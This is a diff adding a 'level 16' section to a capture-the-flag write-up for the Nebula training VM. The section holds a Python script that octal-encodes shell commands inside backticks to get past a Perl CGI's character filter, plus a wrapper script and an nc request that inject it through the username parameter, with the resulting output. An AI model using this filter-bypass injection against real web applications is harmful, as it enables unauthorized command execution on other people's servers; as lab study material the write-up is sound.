@@ -486,3 +486,71 @@ level15@nebula:~$ /home/flag15/flag15
 You have successfully executed getflag on a target account
 Segmentation fault
 ```
+
+
+level 16
+-----------
+
+##### see perl user input vulnerabilities and program execution
+> ref:
+> 1. [cgisecurity.com/lib/sips.html](http://www.cgisecurity.com/lib/sips.html)
+> 2. [novosial.org/perl/backticks/](novosial.org/perl/backticks/)
+
+##### inspect perl cgi script and use octal encoding to bypass the 'tr' transformation
+```python
+# shell_to_perl_injection.py
+# encode string to octal bash notation and wrap with backsticks
+
+#!/usr/bin/env python
+import sys
+
+# define backslash
+BSL = '\\'
+# define backstick
+BST = '`'
+
+c_cmd = sys.argv[1]
+
+# encode to octal with bash notation
+o_cmd = '$\'{}{}\''.format(
+    BSL, BSL.join('{:03o}'.format(x) for x in bytearray(c_cmd.encode())))
+
+perl_injection = '{}{}{}'.format(BST, o_cmd, BST)
+
+print(perl_injection)
+```
+
+##### write the wrapper to execute any shell under suid flag16 binary
+```bash
+# /tmp/any_wrapper_shell
+#!/bin/bash
+getflag > /tmp/getflag16.$$.log
+```
+
+##### connect to http server and exploit backstick vulnerability via username injection
+```bash
+level16@nebula:~$ chmod +x /tmp/any_wrapper_shell
+
+level16@nebula:~$ injection=`./shell_to_perl_injection.py /tmp/any_wrapper_shell`
+level16@nebula:~$ echo $injection 
+`$'\057\164\155\160\057\141\156\171\137\167\162\141\160\160\145\162\137\163\150\145\154\154'`
+
+level16@nebula:~$ echo -e "GET http://nebula:1616/index.cgi?username=$injection HTTP/1.1\n\n" | nc -v nebula 1616
+Connection to nebula 1616 port [tcp/*] succeeded!
+HTTP/1.0 200 OK
+Content-type: text/html
+
+<html>
+<head><title>Login resuls</title></head>
+<body>Your login failed<br/>Would you like a cookie?<br/><br/></body>
+</html>
+
+level16@nebula:~$ ll /tmp/getflag16.4254.log 
+-rw-r--r-- 1 flag16 flag16 59 2016-08-20 17:29 /tmp/getflag16.4254.log
+
+level16@nebula:~$ cat /tmp/getflag16.4254.log 
+You have successfully executed getflag on a target account
+```
+
+> Note: see pwntester article using bash '*' wildcard character
+> [ref: pwntester.com/blog/2013/11/26/nebula-level16-write-up/](http://www.pwntester.com/blog/2013/11/26/nebula-level16-write-up/)
